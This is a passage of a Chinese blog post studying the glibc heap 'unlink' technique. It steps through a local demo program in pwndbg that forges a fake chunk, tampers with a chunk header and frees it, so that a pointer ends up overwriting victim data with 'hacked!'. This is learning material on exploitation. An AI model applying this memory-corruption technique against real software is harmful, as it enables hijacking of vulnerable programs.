class="hljs-number">0x00000000004006e2</span> &lt;+<span class="hljs-number">124</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edi</span>,<span class="hljs-number">0x4008ae</span><br>   <span class="hljs-number">0x00000000004006e7</span> &lt;+<span class="hljs-number">129</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x00000000004006ec</span> &lt;+<span class="hljs-number">134</span>&gt;:   <span class="hljs-keyword">call</span>   <span class="hljs-number">0x400530</span> &lt;printf@plt&gt;<br>   <span class="hljs-number">0x00000000004006f1</span> &lt;+<span class="hljs-number">139</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x40</span>]<br>   <span class="hljs-number">0x00000000004006f5</span> &lt;+<span class="hljs-number">143</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x30</span>],<span class="hljs-built_in">rax</span><br>=&gt; <span class="hljs-number">0x00000000004006f9</span> &lt;+<span class="hljs-number">147</span>&gt;:   <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x40</span>]<br></code></pre></td></tr></table></figure>
+<p>我在main_139行处下了断点,也就是第一次强转的地方,然后让第一次强转结束,这时看一下内存:</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; p/x chunk1<br>$<span class="hljs-number">6</span> = <span class="hljs-number">0x602010</span><br>pwndbg&gt; p/x fake_chunk<br>$<span class="hljs-number">7</span> = <span class="hljs-number">0x602010</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x602010</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602050</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x602010</span>-<span class="hljs-number">16</span><br><span class="hljs-number">0x602000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000091</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure>
+<p>可以看到chunk_size是0x91,因为我们申请了0x80的内存,加上前面的16字节,然后和16位对齐,加一位标志位就刚刚好是0x91,此时的fake_chunk</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">$<span class="hljs-number">22</span> <span class="hljs-operator">=</span> &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">buf</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>然后我们把后两步对于fd指针和bk指针的操作走完,再看一下内存</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000091</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00007fffffffe5d8      <span class="hljs-number">0</span>x00007fffffffe5e0<br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure>
+<p>此时的fake_chunk:</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">$<span class="hljs-number">24</span> <span class="hljs-operator">=</span> &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7fffffffe5d8,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7fffffffe5e0,<br>  <span class="hljs-attr">buf</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>我们看一下fd指针和bk指针的指向内存:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0</span>x7fffffffe5d8<br><span class="hljs-attribute">0x7fffffffe5d8</span>: <span class="hljs-number">0</span>x00007ffff7ffe168      <span class="hljs-number">0</span>x0000000000000003<br><span class="hljs-attribute">0x7fffffffe5e8</span>: <span class="hljs-number">0</span>x00000000004006f1      <span class="hljs-number">0</span>x0000000000602010<br><span class="hljs-attribute">0x7fffffffe5f8</span>: <span class="hljs-number">0</span>x00000000006020a0      <span class="hljs-number">0</span>x0000000000602010<br><span class="hljs-attribute">0x7fffffffe608</span>: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x00000000004007f0<br><span class="hljs-attribute">0x7fffffffe618</span>: <span class="hljs-number">0</span>x0000000000400570      <span class="hljs-number">0</span>x00007fffffffe710<br><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0</span>x7fffffffe5e0<br><span class="hljs-attribute">0x7fffffffe5e0</span>: <span class="hljs-number">0</span>x0000000000000003      <span class="hljs-number">0</span>x00000000004006f1<br><span class="hljs-attribute">0x7fffffffe5f0</span>: <span class="hljs-number">0</span>x0000000000602010      <span class="hljs-number">0</span>x00000000006020a0<br><span class="hljs-attribute">0x7fffffffe600</span>: <span class="hljs-number">0</span>x0000000000602010      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7fffffffe610</span>: <span class="hljs-number">0</span>x00000000004007f0      <span class="hljs-number">0</span>x0000000000400570<br><span class="hljs-attribute">0x7fffffffe620</span>: <span class="hljs-number">0</span>x00007fffffffe710      <span class="hljs-number">0</span>xd26463308dde9200<br></code></pre></td></tr></table></figure>
+<p>此时的fake_chunk_fd:</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">$<span class="hljs-number">26</span> <span class="hljs-operator">=</span> &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">140737354129768</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x4006f1 <span class="hljs-operator">&lt;</span>main<span class="hljs-operator">+</span><span class="hljs-number">139</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x602010,<br>  <span class="hljs-attr">buf</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\2</span>40 `<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>20 &quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>fake_chunk-&gt;bk:</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">$<span class="hljs-number">27</span> <span class="hljs-operator">=</span> &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">4196081</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x602010,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x6020a0,<br>  <span class="hljs-attr">buf</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\0</span>20 `<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>此时fake_chunk-&gt;fd-&gt;bk&#x3D;chunk1<br>    fake_chunk-&gt;bk-&gt;fd&#x3D;chunk1<br>成功绕过指针指向检测<br>这里我们重新看看之前都做了什么操作</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl">fake_chunk = (struct chunk_structure *)chunk1;<br><span class="hljs-function"><span class="hljs-title">fake_chunk</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fd</span> = (struct chunk_structure *)(&amp;chunk1 - 3); // Ensures P-&gt;</span><span class="hljs-function"><span class="hljs-title">fd</span>-&gt;</span>bk == P<br><span class="hljs-function"><span class="hljs-title">fake_chunk</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span> = (struct chunk_structure *)(&amp;chunk1 - 2); // Ensures P-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span>-&gt;</span>fd == P<br></code></pre></td></tr></table></figure>
+<p>先让fake_chunk指向chunk1,然后把fake_chunk的fd指向chunk1-3的位置,这个位置正好能让fake_chunk-&gt;fd-&gt;bk&#x3D;fake_chunk(chunk1),第三号同理,这时我们就成功通过了unlink的检测.</p>
+<p>然后我们就需要看size的检测了,这是现在栈里的布局</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; stack <span class="hljs-number">10</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0</span>x7fffffffe5f0 —▸ <span class="hljs-number">0</span>x602010 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0</span>x7fffffffe5f8 —▸ <span class="hljs-number">0</span>x6020a0 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0</span>x7fffffffe600 —▸ <span class="hljs-number">0</span>x602010 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0</span>x7fffffffe608 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">04</span>:<span class="hljs-number">0020</span>│      <span class="hljs-number">0</span>x7fffffffe610 —▸ <span class="hljs-number">0</span>x4007f0 (__libc_csu_init) ◂— push   r15<br><span class="hljs-attribute">05</span>:<span class="hljs-number">0028</span>│      <span class="hljs-number">0</span>x7fffffffe618 —▸ <span class="hljs-number">0</span>x400570 (_start) ◂— xor    ebp, ebp<br><span class="hljs-attribute">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0</span>x7fffffffe620 —▸ <span class="hljs-number">0</span>x7fffffffe710 ◂— <span class="hljs-number">0</span>x1<br><span class="hljs-attribute">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0</span>x7fffffffe628 ◂— <span class="hljs-number">0</span>xd26463308dde9200<br><span class="hljs-attribute">08</span>:<span class="hljs-number">0040</span>│ rbp  <span class="hljs-number">0</span>x7fffffffe630 —▸ <span class="hljs-number">0</span>x4007f0 (__libc_csu_init) ◂— push   r15<br><span class="hljs-attribute">09</span>:<span class="hljs-number">0048</span>│      <span class="hljs-number">0</span>x7fffffffe638 —▸ <span class="hljs-number">0</span>x7ffff7a2d830 (__libc_start_main+<span class="hljs-number">240</span>) ◂— mov    edi, eax<br></code></pre></td></tr></table></figure>
+<p>后面要进行的操作是这样的:</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-comment">// Next modify the header of chunk2 to pass all security checks</span><br> chunk2_hdr = (struct chunk_structure *)(chunk2 - <span class="hljs-number">2</span>);<br> <span class="hljs-function"><span class="hljs-title">chunk2_hdr</span>-&gt;</span>prev_size = <span class="hljs-number">0</span>x80;  <span class="hljs-comment">// chunk1&#x27;s data region size</span><br> <span class="hljs-function"><span class="hljs-title">chunk2_hdr</span>-&gt;</span>size &amp;= ~<span class="hljs-number">1</span>;        <span class="hljs-comment">// Unsetting prev_in_use bit</span><br><br> <span class="hljs-comment">// Now, when chunk2 is freed, attacker&#x27;s fake chunk is &#x27;unlinked&#x27;</span><br> <span class="hljs-comment">// This results in chunk1 pointer pointing to chunk1 - 3</span><br> <span class="hljs-comment">// i.e. chunk1[3] now contains chunk1 itself.</span><br> <span class="hljs-comment">// We then make chunk1 point to some victim&#x27;s data</span><br> free(chunk2);<br></code></pre></td></tr></table></figure>
+<p>  鉴于我们要用unlink操作,因此我们要把pre_size设为之前的chunk的size,然后把chunk2 free掉,下面就是进行Unlink操作了,free掉之后的栈里是这样的:<br>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache">  <span class="hljs-attribute">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0</span>x7fffffffe5f0 —▸ <span class="hljs-number">0</span>x7fffffffe5d8 —▸ <span class="hljs-number">0</span>x400570 (_start) ◂— xor    ebp, ebp<br><span class="hljs-attribute">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0</span>x7fffffffe5f8 —▸ <span class="hljs-number">0</span>x6020a0 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0</span>x7fffffffe600 —▸ <span class="hljs-number">0</span>x602010 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0</span>x7fffffffe608 —▸ <span class="hljs-number">0</span>x602090 ◂— <span class="hljs-number">0</span>x80<br><span class="hljs-attribute">04</span>:<span class="hljs-number">0020</span>│      <span class="hljs-number">0</span>x7fffffffe610 —▸ <span class="hljs-number">0</span>x400800 (__libc_csu_init) ◂— push   r15<br><span class="hljs-attribute">05</span>:<span class="hljs-number">0028</span>│      <span class="hljs-number">0</span>x7fffffffe618 —▸ <span class="hljs-number">0</span>x400570 (_start) ◂— xor    ebp, ebp<br><span class="hljs-attribute">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0</span>x7fffffffe620 —▸ <span class="hljs-number">0</span>x7fffffffe710 ◂— <span class="hljs-number">0</span>x1<br><span class="hljs-attribute">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0</span>x7fffffffe628 ◂— <span class="hljs-number">0</span>x8d2094d70fe4fc00<br></code></pre></td></tr></table></figure><br>可以看到我们已经成功的把chunk1的地址劫持到了0x7ffffffe5d8的位置,内存空间如下:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">11</span>gx <span class="hljs-number">0</span>x7fffffffe5d8-<span class="hljs-number">16</span><br><span class="hljs-attribute">0x7fffffffe5c8</span>: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x00007fffffffe630<br><span class="hljs-attribute">0x7fffffffe5d8</span>: <span class="hljs-number">0</span>x0000000000400570      <span class="hljs-number">0</span>x00007fffffffe710<br><span class="hljs-attribute">0x7fffffffe5e8</span>: <span class="hljs-number">0</span>x0000000000400753      <span class="hljs-number">0</span>x00007fffffffe5d8<br><span class="hljs-attribute">0x7fffffffe5f8</span>: <span class="hljs-number">0</span>x00000000006020a0      <span class="hljs-number">0</span>x0000000000602010<br><span class="hljs-attribute">0x7fffffffe608</span>: <span class="hljs-number">0</span>x0000000000602090      <span class="hljs-number">0</span>x0000000000400800<br><span class="hljs-attribute">0x7fffffffe618</span>: <span class="hljs-number">0</span>x0000000000400570<br></code></pre></td></tr></table></figure>
+<p>这时候我们再看chunk[3],也就是chunk+3</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">11</span>gx <span class="hljs-number">0</span>x7fffffffe5d8+<span class="hljs-number">24</span><br><span class="hljs-attribute">0x7fffffffe5f0</span>: <span class="hljs-number">0</span>x00007fffffffe5d8      <span class="hljs-number">0</span>x00000000006020a0<br><span class="hljs-attribute">0x7fffffffe600</span>: <span class="hljs-number">0</span>x0000000000602010      <span class="hljs-number">0</span>x0000000000602090<br><span class="hljs-attribute">0x7fffffffe610</span>: <span class="hljs-number">0</span>x0000000000400800      <span class="hljs-number">0</span>x0000000000400570<br><span class="hljs-attribute">0x7fffffffe620</span>: <span class="hljs-number">0</span>x00007fffffffe710      <span class="hljs-number">0</span>x8d2094d70fe4fc00<br><span class="hljs-attribute">0x7fffffffe630</span>: <span class="hljs-number">0</span>x0000000000400800      <span class="hljs-number">0</span>x00007ffff7a2d830<br><span class="hljs-attribute">0x7fffffffe640</span>: <span class="hljs-number">0</span>x0000000000000000<br></code></pre></td></tr></table></figure>
+<p>chunk[3]的地址也已经变成了chunk[1]的地址,然后就是最后的几个操作了</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">chunk1</span>[<span class="hljs-number">3</span>] = (unsigned long long)<span class="hljs-class"><span class="hljs-keyword">data</span>;</span><br> <br>  strcpy(<span class="hljs-class"><span class="hljs-keyword">data</span>, &quot;<span class="hljs-type">Victim&#x27;s</span> <span class="hljs-keyword">data</span>&quot;);</span><br> <br>  printf(<span class="hljs-string">&quot;%s\n&quot;</span>,<span class="hljs-class"><span class="hljs-keyword">data</span>);</span><br>  // <span class="hljs-type">Overwrite</span> victim&#x27;s <span class="hljs-class"><span class="hljs-keyword">data</span> using chunk1</span><br>  chunk1[<span class="hljs-number">0</span>] = 0x002164656b636168LL;<br> <br>  printf(<span class="hljs-string">&quot;%s\n&quot;</span>, <span class="hljs-class"><span class="hljs-keyword">data</span>);</span><br></code></pre></td></tr></table></figure>
+<p>先是给chunk[3]赋值为”Victim’s data”,此时的栈:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">│ <span class="hljs-built_in">rdx</span> <span class="hljs-built_in">rsp</span>  <span class="hljs-number">0x7fffffffe5f0</span> —▸ <span class="hljs-number">0x7fffffffe610</span> ◂— <span class="hljs-string">&quot;Victim&#x27;s data&quot;</span><br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│          <span class="hljs-number">0x7fffffffe5f8</span> —▸ <span class="hljs-number">0x6020a0</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│          <span class="hljs-number">0x7fffffffe600</span> —▸ <span class="hljs-number">0x602010</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│          <span class="hljs-number">0x7fffffffe608</span> —▸ <span class="hljs-number">0x602090</span> ◂— <span class="hljs-number">0x80</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│ <span class="hljs-built_in">rax</span>      <span class="hljs-number">0x7fffffffe610</span> ◂— <span class="hljs-string">&quot;Victim&#x27;s data&quot;</span><br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│          <span class="hljs-number">0x7fffffffe618</span> ◂— <span class="hljs-number">0x6174616420</span> /* <span class="hljs-string">&#x27; data&#x27;</span> */<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│          <span class="hljs-number">0x7fffffffe620</span> —▸ <span class="hljs-number">0x7fffffffe710</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│          <span class="hljs-number">0x7fffffffe628</span> ◂— <span class="hljs-number">0x8d2094d70fe4fc00</span><br></code></pre></td></tr></table></figure>
+<p>chunk1的内容:</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> x<span class="hljs-symbol">/s</span> chunk1<br><span class="hljs-number">0</span><span class="hljs-params">x7fffffffe610:</span> <span class="hljs-string">&quot;Victim&#x27;s data&quot;</span><br></code></pre></td></tr></table></figure>
+<p>我们的chunk1已经改成了<code>Victim&#39;s data</code><br>然后进行chunk1[0]的赋值,此时的栈:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0</span>x7fffffffe5f0 —▸ <span class="hljs-number">0</span>x7fffffffe610 ◂— <span class="hljs-number">0</span>x2164656b636168 /* &#x27;hacked!&#x27; */<br><span class="hljs-attribute">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0</span>x7fffffffe5f8 —▸ <span class="hljs-number">0</span>x6020a0 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0</span>x7fffffffe600 —▸ <span class="hljs-number">0</span>x602010 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0</span>x7fffffffe608 —▸ <span class="hljs-number">0</span>x602090 ◂— <span class="hljs-number">0</span>x80<br><span class="hljs-attribute">04</span>:<span class="hljs-number">0020</span>│ rax  <span class="hljs-number">0</span>x7fffffffe610 ◂— <span class="hljs-number">0</span>x2164656b636168 /* &#x27;hacked!&#x27; */<br><span class="hljs-attribute">05</span>:<span class="hljs-number">0028</span>│      <span class="hljs-number">0</span>x7fffffffe618 ◂— <span class="hljs-number">0</span>x6174616420 /* &#x27; data&#x27; */<br><span class="hljs-attribute">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0</span>x7fffffffe620 —▸ <span class="hljs-number">0</span>x7fffffffe710 ◂— <span class="hljs-number">0</span>x1<br><span class="hljs-attribute">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0</span>x7fffffffe628 ◂— <span class="hljs-number">0</span>x8d2094d70fe4fc00<br></code></pre></td></tr></table></figure>
+<p>此时的data:</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">pwndbg</span>&gt; x/s <span class="hljs-class"><span class="hljs-keyword">data</span></span><br><span class="hljs-number">0x7fffffffe610</span>: <span class="hljs-string">&quot;hacked!&quot;</span><br></code></pre></td></tr></table></figure>
+<p>Over~</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>unlink_study</div>
+      <div>https://nightrainy.github.io/2019/07/19/unlink-study/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>知世</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2019年7月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
